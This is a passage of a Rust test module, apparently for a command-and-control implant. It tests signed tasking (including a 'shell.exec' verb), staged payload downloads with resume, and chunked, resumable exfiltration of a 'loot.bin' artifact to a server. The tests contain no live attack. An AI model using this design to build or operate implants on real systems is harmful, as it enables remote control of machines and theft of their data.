        // Idempotent: the second sync adds nothing.
        session.sync_module_advertisements();
        let again = advertised_of(&mut session);
        assert_eq!(
            again.iter().filter(|verb| *verb == "recon.sweep").count(),
            1
        );
    }

    #[test]
    fn unsigned_tasking_fails_closed_into_the_batch() {
        let mut session = bare_session(None);
        let task = TaskRequest {
            task_id: "t-1".into(),
            verb: "shell.exec".into(),
            arguments: "id".into(),
            ..Default::default()
        };
        session.accept(&task, false);
        let batch = session.outbox.batch();
        assert_eq!(batch.len(), 1);
        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
        assert_eq!(result.outcome, 2);
        assert!(result.output.contains("signature"), "{}", result.output);
    }

    #[test]
    fn nonceless_redelivery_answers_from_the_ledger_cache() {
        let mut rng = rand::thread_rng();
        let private = rsa::RsaPrivateKey::new(&mut rng, 2048).expect("rsa keygen");
        let spki = private
            .to_public_key()
            .to_public_key_der()
            .expect("spki der");
        let signer = Certificate {
            spki: spki.as_bytes().to_vec(),
        };
        let mut session =
            Session::new("i-1".into(), &[], cadence(), vec![signer], None, None, true);
        let mut task = TaskRequest {
            task_id: "t-1".into(),
            verb: "no.such.verb".into(),
            arguments: "x".into(),
            ..Default::default()
        };
        let canonical =
            crate::verify::canonical_bytes("i-1", &task.task_id, &task.verb, &task.arguments, None);
        let signing = rsa::pss::SigningKey::<sha2::Sha256>::new(private);
        let mut rng = rand::thread_rng();
        task.signature = signing.sign_with_rng(&mut rng, &canonical).to_vec();
        // First delivery: the ack, then the one dispatch's result.
        session.accept(&task, true);
        let first = session.outbox.batch();
        assert_eq!(first.len(), 2, "the ack and the result");
        let executed = TaskResult::decode(first[1].payload.as_ref()).expect("the result decodes");
        session.outbox.batch_crossed(first.len());
        // Redelivery: re-acked and answered from the cache, with the same
        // output the single execution produced.
        session.accept(&task, true);
        let second = session.outbox.batch();
        assert_eq!(second.len(), 2);
        let cached = TaskResult::decode(second[1].payload.as_ref()).expect("the cached result");
        assert_eq!(cached.task_id, executed.task_id);
        assert_eq!(cached.output, executed.output);
    }

    #[test]
    fn staged_tasking_verifies_before_registering() {
        // Unsigned staged tasking fails closed: no transfer registers, the
        // rejection queues -- the staged arm sits behind the same Tier 1
        // verification as every other acceptance.
        let mut session = bare_session(None);
        let task = TaskRequest {
            task_id: "st-1".into(),
            verb: "file.push".into(),
            arguments: "/tmp/rod-staged-test sha256:abc".into(),
            staged_bytes: Some(2048),
            ..Default::default()
        };
        session.accept(&task, false);
        assert!(!session.staged_holds(&task.task_id));
        let batch = session.outbox.batch();
        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
        assert_eq!(result.outcome, 2);
        assert!(result.output.contains("signature"), "{}", result.output);
    }

    #[test]
    fn staged_transfers_resume_from_the_held_seam() {
        let payload: Vec<u8> = (0..2500u32).map(|i| i as u8).collect();
        let (mut session, task) = staged_session(&payload);
        assert!(session.staged_holds(&task.task_id));

        // The fresh demand carries the plain shape: no offset, no proof.
        let fresh = session.staged_demands();
        assert_eq!(fresh.len(), 1);
        let pull = StagedPull::decode(fresh[0].payload.as_ref()).expect("the demand decodes");
        assert_eq!(pull.offset, None);
        assert_eq!(pull.prefix_sha256, None);

        // An interrupted run placed the first thousand bytes.
        session.accept_staged_chunk(&chunk("st-1", 0, 0, false, &payload[..1000]));
        let (offset, proof) = session.staged_seam("st-1");
        assert_eq!(offset, 1000);
        let expected_proof = Sha256::digest(&payload[..1000]);
        assert_eq!(proof, Some(expected_proof.to_vec()));

        // The next demand names those bytes and proves them; the remainder
        // places at the seam and the terminal dispatches with the payload's
        // hash on the result -- the both-side arm.
        let resumed = session.staged_demands();
        let pull = StagedPull::decode(resumed[0].payload.as_ref()).expect("the demand decodes");
        assert_eq!(pull.offset, Some(1000));
        assert_eq!(pull.prefix_sha256.as_deref(), Some(expected_proof.as_ref()));
        session.accept_staged_chunk(&chunk("st-1", 0, 1000, true, &payload[1000..]));
        assert!(!session.staged_holds("st-1"));

        let batch = session.outbox.batch();
        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
        assert_eq!(result.outcome, 1, "{}", result.output);
        assert_eq!(
            result.payload_sha256.as_deref(),
            Some(hex_sha256(&Sha256::digest(&payload)).as_str())
        );
    }

    #[test]
    fn staged_restart_on_offset_zero_resets_the_transfer() {
        // The task's arguments bind the payload the server restarts with;
        // the bytes an aborted first attempt placed are the ones discarded.
        let payload = b"the restarted payload";
        let (mut session, _) = staged_session(payload);
        session.accept_staged_chunk(&chunk("st-1", 0, 0, false, b"bytes the restart discards"));
        // The server rejected the seam (or a pre-resume server answered the
        // whole run): offset 0 names a restart, not an append.
        session.accept_staged_chunk(&chunk("st-1", 0, 0, true, payload));
        assert!(!session.staged_holds("st-1"));
        let batch = session.outbox.batch();
        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
        assert_eq!(result.outcome, 1, "{}", result.output);
        assert_eq!(
            result.payload_sha256.as_deref(),
            Some(hex_sha256(&Sha256::digest(payload)).as_str())
        );
    }

    #[test]
    fn staged_sequence_zero_on_a_legacy_server_resets_the_transfer() {
        // A pre-resume server never sends the offset field: its full run
        // restarts at sequence 0, which over a non-empty hold is the reset
        // signal, and later chunks append in arrival order.
        let payload = b"the whole run from a legacy server";
        let (mut session, _) = staged_session(payload);
        // A resumed attempt had placed foreign bytes at 0 before the legacy
        // server answered the demand with a full offset-less run.
        session.accept_staged_chunk(&chunk("st-1", 0, 0, false, b"a partial from earlier"));
        let legacy = StagedChunk {
            task_id: "st-1".into(),
            sequence: 0,
            terminal: false,
            data: payload[..10].to_vec(),
            offset: None,
        };
        session.accept_staged_chunk(&legacy);
        session.accept_staged_chunk(&StagedChunk {
            task_id: "st-1".into(),
            sequence: 1,
            terminal: true,
            data: payload[10..].to_vec(),
            offset: None,
        });
        let batch = session.outbox.batch();
        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
        assert_eq!(result.outcome, 1, "{}", result.output);
        assert_eq!(
            result.payload_sha256.as_deref(),
            Some(hex_sha256(&Sha256::digest(payload)).as_str())
        );
    }

    #[test]
    fn staged_gap_keeps_the_hold_and_the_idle_guard_fails_the_task() {
        let payload = vec![7u8; 4096];
        let (mut session, task) = staged_session(&payload);
        // A chunk past the seam is a gap: nothing places, the transfer keeps
        // its state for the next demand.
        session.accept_staged_chunk(&chunk("st-1", 9, 9000, false, &[1, 2, 3]));
        assert!(session.staged_holds(&task.task_id));

        // Three cycles without progress end the task honestly.
        session.staged_cycle_end();
        session.staged_cycle_end();
        assert!(session.staged_holds(&task.task_id));
        session.staged_cycle_end();
        assert!(!session.staged_holds(&task.task_id));
        let batch = session.outbox.batch();
        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
        assert_eq!(result.outcome, 2);
        assert!(result.output.contains("ended without a terminal chunk"));

        // A transfer that grows keeps its patience.
        let (mut growing, _) = staged_session(&payload);
        growing.accept_staged_chunk(&chunk("st-1", 0, 0, false, &payload[..512]));
        for round in 0..5 {
            growing.staged_cycle_end();
            let from = 512 + round * 512;
            growing.accept_staged_chunk(&chunk(
                "st-1",
                1,
                from as u64,
                false,
                &payload[from..from + 512],
            ));
        }
        assert!(growing.staged_holds("st-1"));
    }

    /// A session with one registered upload run, sliced as the carriages
    /// slice it.
    fn exfil_session(data: &[u8]) -> Session {
        let mut session = bare_session(None);
        session.register_exfil(
            "t-1",
            ArtifactRun {
                name: "loot.bin".into(),
                content_type: "application/octet-stream".into(),
                data: data.to_vec(),
            },
        );
        session
    }

    fn decode_exfil(frame: &Frame) -> ExfilChunk {
        ExfilChunk::decode(frame.payload.as_ref()).expect("the slice decodes")
    }

    #[test]
    fn upload_runs_slice_under_the_budget_and_resume_from_reports() {
        let data: Vec<u8> = (0..(EXFIL_CHUNK_BYTES * 2 + 100) as u32)
            .map(|i| (i % 251) as u8)
            .collect();
        let mut session = exfil_session(&data);
        let declared = Sha256::digest(&data).to_vec();

        // One contact admits two full slices under the budget; every slice
        // carries its absolute offset and the run's declared hash.
        let first = session.exfil_frames(EXFIL_CHUNK_BYTES * 2);
        assert_eq!(first.len(), 2);
        let a = decode_exfil(&first[0]);
        let b = decode_exfil(&first[1]);
        assert_eq!(a.offset, Some(0));
        assert_eq!(b.offset, Some(EXFIL_CHUNK_BYTES as u64));
        assert!(!a.terminal);
        assert!(!b.terminal);
        assert_eq!(a.payload_sha256.as_deref(), Some(declared.as_slice()));

        // The report moves the seam; the next contact serves only the
        // remainder -- a full slice plus the byte tail, terminal on the
        // tail.
        session.exfil_progress("t-1", "loot.bin", EXFIL_CHUNK_BYTES as u64);
        let second = session.exfil_frames(EXFIL_CONTACT_BUDGET);
        assert_eq!(second.len(), 2);
        let c = decode_exfil(&second[0]);
        let d = decode_exfil(&second[1]);
        assert_eq!(c.offset, Some(EXFIL_CHUNK_BYTES as u64));
        assert!(!c.terminal);
        assert_eq!(d.offset, Some((2 * EXFIL_CHUNK_BYTES) as u64));
        assert!(d.terminal);
        assert_eq!(d.data.len(), 100);

        // A report at the run's end retires it.
        session.exfil_progress("t-1", "loot.bin", data.len() as u64);
        assert!(!session.exfil_pending());
        assert!(session.exfil_frames(EXFIL_CONTACT_BUDGET).is_empty());
    }

    #[test]
    fn a_missing_report_re_sends_from_the_last_confirmed_seam() {
        // A contact that died in flight never moved the seam: the next
        // contact re-sends the same slices (a duplicate is a no-op
        // server-side).
        let data = vec![5u8; EXFIL_CHUNK_BYTES + 32];
        let mut session = exfil_session(&data);
        let _ = session.exfil_frames(EXFIL_CONTACT_BUDGET);
        let again = session.exfil_frames(EXFIL_CONTACT_BUDGET);
        let slice = decode_exfil(&again[0]);
        assert_eq!(slice.offset, Some(0));
    }

    #[test]
    fn a_rewinding_report_re_serves_from_the_named_seam() {
        // An evicted or restarted server reports fewer bytes than were sent:
        // the run rewinds to the report and re-serves from there.
        let data = vec![9u8; EXFIL_CHUNK_BYTES * 2];
        let mut session = exfil_session(&data);
        let _ = session.exfil_frames(EXFIL_CONTACT_BUDGET);
        session.exfil_progress("t-1", "loot.bin", 0);
        let resent = session.exfil_frames(EXFIL_CONTACT_BUDGET);
        assert_eq!(resent.len(), 2);
        assert_eq!(decode_exfil(&resent[0]).offset, Some(0));
    }

    #[test]
    fn the_no_progress_guard_drops_a_stalled_run() {
        let data = vec![3u8; 64];
        let mut session = exfil_session(&data);
        // Slices cross but no report ever comes: three idle cycles drop the
        // run -- the artifact is lost, the session does not carry it.
        for _ in 0..2 {
            session.exfil_cycle_end();
            assert!(session.exfil_pending());
        }
        session.exfil_cycle_end();
        assert!(!session.exfil_pending());

        // A report between cycles keeps the run alive.
        let mut growing = exfil_session(&data);
        growing.exfil_progress("t-1", "loot.bin", 32);
        growing.exfil_cycle_end();
        for _ in 0..2 {
            growing.exfil_cycle_end();
        }
        assert!(growing.exfil_pending());
    }
}
